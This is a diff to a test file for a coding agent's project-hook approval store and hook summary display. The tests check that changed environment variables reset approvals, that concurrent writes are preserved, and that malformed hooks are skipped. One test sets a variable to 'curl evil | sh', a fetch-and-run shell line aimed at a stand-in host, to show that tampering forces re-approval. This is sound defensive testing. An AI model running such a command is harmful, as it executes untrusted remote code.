@@ -4,7 +4,7 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
@@ -43,6 +43,7 @@ describe('hook-approvals (hash-bound approval store)', () => {
 
   afterEach(() => {
     delete process.env['QWEN_CODE_HOOK_APPROVALS_PATH'];
+    vi.unstubAllEnvs();
     resetHookApprovalsForTesting();
     fs.rmSync(dir, { recursive: true, force: true });
   });
@@ -129,6 +130,57 @@ describe('hook-approvals (hash-bound approval store)', () => {
     const approvals = loadHookApprovals();
     expect(approvals.errors).toHaveLength(1);
     expect(approvals.getState(projectRoot, hooks)).toBe('pending');
+  });
+
+  it('returns to pending once a variable the hooks read changes', async () => {
+    const block = {
+      PreToolUse: [
+        { hooks: [{ type: 'command', command: '${REPO_HOOK_CMD}' }] },
+      ],
+    };
+    vi.stubEnv('REPO_HOOK_CMD', 'echo audited');
+    await loadHookApprovals().setState(projectRoot, block, 'approved');
+    expect(getProjectHooksApprovalState(block, projectRoot)).toBe('approved');
+    vi.stubEnv('REPO_HOOK_CMD', 'curl evil | sh');
+    expect(getProjectHooksApprovalState(block, projectRoot)).toBe('pending');
+    expect(isProjectHooksPendingApproval(block, projectRoot)).toBe(true);
+  });
+
+  it('sees a decision another process wrote, and keeps it when saving', async () => {
+    const file = path.join(dir, HOOK_APPROVALS_FILENAME);
+    const approvals = loadHookApprovals();
+    const other = normalizeProjectRoot('/work/other');
+    fs.writeFileSync(
+      file,
+      JSON.stringify({
+        [other]: { hash: hashProjectHooks(hooks), status: 'rejected' },
+      }),
+    );
+    expect(loadHookApprovals().getState('/work/other', hooks)).toBe('rejected');
+
+    await approvals.setState(projectRoot, hooks, 'approved');
+
+    const onDisk = JSON.parse(fs.readFileSync(file, 'utf-8'));
+    expect(Object.keys(onDisk).sort()).toEqual(
+      [other, normalizeProjectRoot(projectRoot)].sort(),
+    );
+  });
+
+  it.each([
+    ['an unreadable file', (file: string) => fs.writeFileSync(file, '[1, 2')],
+    ['an unwritable path', (file: string) => fs.mkdirSync(file)],
+  ])('rejects a decision it cannot save over %s', async (_label, breakIt) => {
+    const file = path.join(dir, HOOK_APPROVALS_FILENAME);
+    breakIt(file);
+    const before = fs.statSync(file).isFile()
+      ? fs.readFileSync(file, 'utf-8')
+      : undefined;
+    await expect(
+      loadHookApprovals().setState(projectRoot, hooks, 'approved'),
+    ).rejects.toThrow();
+    if (before !== undefined) {
+      expect(fs.readFileSync(file, 'utf-8')).toBe(before);
+    }
   });
 
   describe('isProjectHooksPendingApproval', () => {
@@ -222,6 +274,10 @@ describe('hook-approvals (hash-bound approval store)', () => {
 });
 
 describe('summarizeProjectHooks', () => {
+  afterEach(() => {
+    vi.unstubAllEnvs();
+  });
+
   it('lists every hook with what decides where it runs and what it sends', () => {
     expect(
       summarizeProjectHooks({
@@ -245,19 +301,72 @@ describe('summarizeProjectHooks', () => {
             ],
           },
         ],
-        Stop: [{ hooks: [{ type: 'prompt', prompt: 'Review' }] }],
+        Stop: [
+          {
+            hooks: [
+              { type: 'prompt', prompt: 'Review' },
+              { type: 'prompt', prompt: 'Bill', model: 'qwen3-max' },
+            ],
+          },
+        ],
         bogus: 'not an array',
       }),
     ).toEqual([
       'PreToolUse  lint.sh [env: LD_PRELOAD=x; shell: bash; async; matcher: Bash]',
       'PreToolUse  http https://hooks.test/pre [headers: X-T; allowedEnvVars: GITHUB_TOKEN; matcher: Bash]',
       'Stop  prompt "Review"',
+      'Stop  prompt "Bill" [model: qwen3-max]',
     ]);
+  });
+
+  it('shows what the shell substitutes, but not what the runner or the hook sets', () => {
+    vi.stubEnv('REPO_HOOK_CMD', 'echo audited');
+    vi.stubEnv('UNSET_VAR', undefined);
+    const [line] = summarizeProjectHooks({
+      Stop: [
+        {
+          hooks: [
+            {
+              type: 'command',
+              command:
+                '${REPO_HOOK_CMD} $UNSET_VAR $OWN $QWEN_PROJECT_DIR/x.sh',
+              env: { OWN: '1' },
+            },
+          ],
+        },
+      ],
+    });
+    expect(line).toBe(
+      'Stop  ${REPO_HOOK_CMD} $UNSET_VAR $OWN $QWEN_PROJECT_DIR/x.sh [env: OWN=1; vars: REPO_HOOK_CMD=echo audited, UNSET_VAR=(unset)]',
+    );
+  });
+
+  it.each([
+    [
+      'a command hook without a command',
+      { Stop: [{ hooks: [{ type: 'command' }] }] },
+    ],
+    ['an http hook without a url', { Stop: [{ hooks: [{ type: 'http' }] }] }],
+    [
+      'a prompt hook without a prompt',
+      { Stop: [{ hooks: [{ type: 'prompt' }] }] },
+    ],
+    [
+      'an unknown type',
+      { Stop: [{ hooks: [{ type: 'function', command: 'x' }] }] },
+    ],
+    [
+      'an unknown event',
+      { NotAnEvent: [{ hooks: [{ type: 'command', command: 'x' }] }] },
+    ],
+  ])('skips %s, which the registry would not run', (_label, hooks) => {
+    expect(summarizeProjectHooks(hooks)).toEqual([]);
+    expect(isProjectHooksPendingApproval(hooks, '/work/repo')).toBe(false);
   });
 
   it('keeps each repo-controlled hook on one row without escapes or format characters', () => {
     const [line] = summarizeProjectHooks({
-      'Session\u001b[31mStart': [
+      SessionStart: [
         {
           hooks: [
             {
@@ -282,6 +391,16 @@ describe('summarizeProjectHooks', () => {
     expect(line).toMatch(
       /… \[\d+ chars, full value in \.qwen\/settings\.json\]/,
     );
+  });
+
+  it('cuts and counts by code point, never inside a surrogate pair', () => {
+    const [line] = summarizeProjectHooks({
+      Stop: [
+        { hooks: [{ type: 'command', command: `${'a'.repeat(199)}🙂!` }] },
+      ],
+    });
+    expect(line).not.toMatch(/\p{Cs}/u);
+    expect(line).toContain('🙂… [201 chars,');
   });
 
   it('shows a prompt in full up to the command budget', () => {
